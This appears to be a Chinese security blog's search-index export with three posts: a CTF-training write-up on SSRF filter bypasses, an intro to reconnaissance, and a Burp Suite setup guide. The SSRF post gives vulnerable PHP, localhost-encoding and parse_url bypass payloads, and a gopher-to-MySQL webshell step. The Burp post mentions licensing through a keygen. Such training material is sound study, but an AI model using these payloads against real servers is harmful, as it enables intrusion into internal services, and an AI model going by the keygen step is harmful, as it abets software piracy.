    <content type="html"><![CDATA[<h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$ch</span>=curl_init(<span class="hljs-variable">$url</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>curl_init初始化curl会话</p><p>curl_setopt设置curl传输选项，CURLOPT_HEADER启用时会将头文件的信息作为数据流输出；CURLOPT_RETURNTRANSFER为true时将curl_exec()获取的信息以字符串返回，而不是直接输出。</p><p>curl_exec($sh)抓取 URL 并把它传递给浏览器</p><p><a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=parse_url(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;<br><span class="hljs-variable">$ch</span>=curl_init(<span class="hljs-variable">$url</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=parse_url(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br><span class="hljs-variable">$ch</span>=curl_init(<span class="hljs-variable">$url</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=parse_url(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-keyword">if</span>((strlen(<span class="hljs-variable">$host</span>)&lt;=<span class="hljs-number">5</span>))&#123; <span class="hljs-comment">//strlen($host)&lt;=3</span><br><span class="hljs-variable">$ch</span>=curl_init(<span class="hljs-variable">$url</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>开始过滤了，方法有：</p><ul><li>IP Bypass</li></ul><p>127.0.0.1使用的是点分十进制 绕过如下</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">8</span>进制格式：<span class="hljs-number">0177.00.00</span>.<span class="hljs-number">01</span><br><br><span class="hljs-number">16</span>进制格式：<span class="hljs-number">0</span>x7f.<span class="hljs-number">0x0.0x0</span>.<span class="hljs-number">0</span>x1<br><br><span class="hljs-number">10</span>进制整数格式：<span class="hljs-number">2130706433</span><br><br>特别的，在linux下，<span class="hljs-number">0</span>代表<span class="hljs-number">127.0.0.1</span>，可以用http://<span class="hljs-number">0</span>进行请求<span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>8进制<br><img src="https://img-blog.csdnimg.cn/20210423211039257.png#pic_center"><br>16进制<br><img src="https://img-blog.csdnimg.cn/20210423211353222.png#pic_center"><br>10进制整数：<img src="https://img-blog.csdnimg.cn/20210423211439801.png#pic_center"><br>linux：<br><img src="https://img-blog.csdnimg.cn/20210423211503787.png#pic_center"></p><blockquote><p>127.0.1 、127.1、 127。0.0.1或者转成2进制</p><p><a href="http://sudo.cc/">http://sudo.cc/</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=parse_url(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$ip</span> = gethostbyname(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(!filter_var(<span class="hljs-variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;ip!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;scheme&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211117221246468.png"></p><p>var_filter会检查不是私有地址，DNS重绑定没有复现成功</p><p>测试一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//header(&quot;Location:www.baidu.com&quot;);</span><br>header(<span class="hljs-string">&quot;Location:404 Not Found&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello&quot;</span>;<br></code></pre></td></tr></table></figure><p>这里用到服务器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>)<br></code></pre></td></tr></table></figure><p>header会发送原生http头，一串字符串，上面代码就是用js的Location属性跳转到127.0.0.1/flag.php，然后被header发回</p><p>预期解：</p><ul><li>DNS重绑定</li></ul><p><a href="http://xip.io/">http://xip.io/</a></p><p><a href="http://ceye.io/">http://ceye.io/</a></p><p><a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=parse_url(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="hljs-variable">$url</span>))&#123;<br>    <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-variable">$url</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>URL bypass</li></ul><p>尝试夹杂@ # / \ ?，详见<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">blackhat峰会</a>大佬提到的<code>parse_url</code>解析问题</p><p>  需要以<code>http://ctf.</code>开头<code>show</code>结尾</p><blockquote><p>url=<a href="http://ctf.@127.0.0.1/flag.php?show">http://ctf.@127.0.0.1/flag.php?show</a></p></blockquote><ul><li>gopherus</li></ul><p>mysql写马</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211117234343142.png"></p><p>将<code>gopher://127.0.0.1:3306/_</code>后面再编码一次，bp发包，shell传上</p><p>redis同理</p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集基础篇</title>
    <link href="/2020/11/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    <url>/2020/11/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>721第二次培训:<br>信息收集包括主动以及被动</p><p>本次任务有：分别用c 语言和php写 99 乘法表，csdn写博客（另：下星期由我分享win-dos内容）</p><h2 id="1-被动信息收集"><a href="#1-被动信息收集" class="headerlink" title="1.被动信息收集"></a>1.被动信息收集</h2><p>域名信息查询（<a href="https://www.aizhan.com/">爱站网</a> <a href="http://tool.chinaz.com/">站长工具</a>）<br> 企业信息查询（<a href="https://www.qcc.com/">企查查</a> <a href="http://www.beian.gov.cn/portal/recordQuery">公安部备案查询</a>）<br>Github平台：泄露源码、数据库、邮箱、ftp、ssh、端口3389、个人信息、其他敏感信息</p><p>svn信息、邮件信息（通过爬虫、搜索引擎获取暴露的邮箱，邮件信息收集网站<a href="http://www.skymem.info/">1</a> <a href="http://www.hunter.io/">2</a> <a href="http://email-format.com/">3</a>）</p><p>Google Hacking<br><img src="https://img-blog.csdnimg.cn/2020112000430989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br>Shodan Hacking<br><img src="https://img-blog.csdnimg.cn/20201120004349809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"></p><p>钟馗之眼-Zoomeye Hacking<br><img src="https://img-blog.csdnimg.cn/2020112000442964.png#pic_center"><img src="https://img-blog.csdnimg.cn/20201120004448609.png#pic_center"></p><h2 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h2><p>①直接与目标发生接触（被发现的风险极大）<br>②二层发现 优：扫描快、可靠     缺：不可路由(只能发现本网段的主机)<br>利用的是APR协议，抓包<br>命令有：<img src="https://img-blog.csdnimg.cn/20201120004858371.png#pic_center"><br><img src="https://img-blog.csdnimg.cn/20201120004732355.png#pic_center"></p><p><img src="https://img-blog.csdnimg.cn/20201120004205393.png#pic_center"><br><img src="https://img-blog.csdnimg.cn/20201120004546683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"></p><p>③三层发现<br><img src="https://img-blog.csdnimg.cn/20201120004928587.png#pic_center"><img src="https://img-blog.csdnimg.cn/20201120004938513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center">④四层发现<br><img src="https://img-blog.csdnimg.cn/20201120005033130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><img src="https://img-blog.csdnimg.cn/20201120005051567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center">任务：九九乘法表<br>C语言</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">9</span>; i++) <br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= i; j++) <br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%dx%d=%d &quot;</span>, j, i, i * j);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>php</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>九九乘法表<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span></span><br><span class="css"><span class="xml"><span class="hljs-selector-tag">table</span>&#123;</span></span><br><span class="css"><span class="xml">    <span class="hljs-attribute">border-collapse</span>:collapse; <span class="hljs-attribute">border-spacing</span>:<span class="hljs-number">0</span>; <span class="hljs-attribute">border-left</span>:<span class="hljs-number">1px</span> solid <span class="hljs-number">#aaa</span>; <span class="hljs-attribute">border-top</span>:<span class="hljs-number">1px</span> solid <span class="hljs-number">#aaa</span>; </span></span><br><span class="css"><span class="xml">&#125;</span></span><br><span class="css"><span class="xml"><span class="hljs-selector-tag">td</span>&#123;</span></span><br><span class="css"><span class="xml">    <span class="hljs-attribute">border-right</span>:<span class="hljs-number">1px</span> solid <span class="hljs-number">#aaa</span>; <span class="hljs-attribute">border-bottom</span>:<span class="hljs-number">1px</span> solid <span class="hljs-number">#aaa</span>; <span class="hljs-attribute">padding</span>:<span class="hljs-number">3px</span> <span class="hljs-number">15px</span>; <span class="hljs-attribute">text-align</span><span class="hljs-selector-pseudo">:left</span>; <span class="hljs-attribute">color</span>:<span class="hljs-number">#3C3C3C</span>;</span></span><br><span class="css"><span class="xml">&#125;</span></span><br><span class="css"><span class="xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&#x27;600&#x27;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&#x27;1&#x27;</span>&gt;</span></span><br><span class="xml"></span><span class="php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="php"><span class="hljs-comment">//控制行数</span></span><br><span class="php"> <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$j</span>&lt;=<span class="hljs-number">9</span>;<span class="hljs-variable">$j</span>++)&#123;</span><br><span class="php">     <span class="hljs-comment">//tr开始</span></span><br><span class="php">     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&quot;</span>;</span><br><span class="php">     <span class="hljs-comment">//控制列数</span></span><br><span class="php">     <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-variable">$j</span>;<span class="hljs-variable">$i</span>++)&#123;</span><br><span class="php">         <span class="hljs-comment">//输出td</span></span><br><span class="php">         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;td&gt;<span class="hljs-subst">&#123;$i&#125;</span>x<span class="hljs-subst">&#123;$j&#125;</span>=&quot;</span>.(<span class="hljs-variable">$i</span>*<span class="hljs-variable">$j</span>).<span class="hljs-string">&quot;&lt;/td&gt;&quot;</span>;</span><br><span class="php">    &#125;</span><br><span class="php">    <span class="hljs-comment">//tr结束</span></span><br><span class="php">     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/tr&gt;&quot;</span>;</span><br><span class="php">&#125;</span><br><span class="php"><span class="hljs-meta">?&gt;</span></span><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>​    </p><p>​    </p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>burp</title>
    <link href="/2020/11/19/burp/"/>
    <url>/2020/11/19/burp/</url>
    
    <content type="html"><![CDATA[<p>721第一次培训就网络安全对其进行一些介绍和方向上的讲解，还有一些网络钓鱼，字典爆破等攻击手段，并演示了burp实现对HTTP的抓包，分析抓包的内容，以及分享了利用burp可以实现什么。</p><p>此次任务有：熟悉HTTP协议，利用burp抓包，搭建虚拟机kali。</p><h1 id="重点内容：burp"><a href="#重点内容：burp" class="headerlink" title="重点内容：burp"></a>重点内容：burp</h1><h2 id="1-1burp的安装"><a href="#1-1burp的安装" class="headerlink" title="1.1burp的安装"></a>1.1burp的安装</h2><p>①<strong>配置Java环境</strong><br>(问：为什么要这样配置     答：burp是由Java语言编写而成，其可执行程序是java文件类型的jar文件，运行时依赖于JRE)<br>②<strong>配置系统的环境变量</strong>（环境变量，就是在操作系统中一个具有特定名字的对象，它包含了一个或者多个应用程序所将使用到的信息。例如Windows和DOS操作系统中的path环境变量，当要求系统运行一个程序而没有告诉它程序所在的完整路径时，系统除了在当前目录下面寻找此程序外，还应到path中指定的路径去找。用户通过设置环境变量，来更好的运行进程。）<br>③由于burp是付费软件，我们需要<strong>使用注册机来获取license</strong>，如图<img src="https://img-blog.csdnimg.cn/20201119214908963.gif#pic_center" alt="burp注册机的操作">③注册后即可使用burp</p><h2 id="1-2抓包"><a href="#1-2抓包" class="headerlink" title="1.2抓包"></a>1.2抓包</h2><p>①<strong>对浏览器设置代理</strong>：安装foxyproxy插件，设置代理IP<br>127.0.0.1 端口8080的代理<br>②打开浏览器，打开代理，随便打开一个网站，在burp的<strong>proxy</strong>即可查看对网站HTTP的抓包,将所抓的包发至<strong>repeater</strong>，即可对网站的回应进行拦截。</p><p><img src="https://img-blog.csdnimg.cn/20201119223920841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center" alt="proxy"><br><img src="https://img-blog.csdnimg.cn/20201119224103488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center" alt="repeater"></p><h2 id="搭建kali"><a href="#搭建kali" class="headerlink" title="搭建kali"></a>搭建kali</h2><p>2.1安装VMware Workstation （略）<br>2.2下载镜像文件（略）<br>2.3安装kali（略）</p><h2 id="3-HTTP协议—–看书"><a href="#3-HTTP协议—–看书" class="headerlink" title="3.HTTP协议—–看书"></a>3.HTTP协议—–看书</h2>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
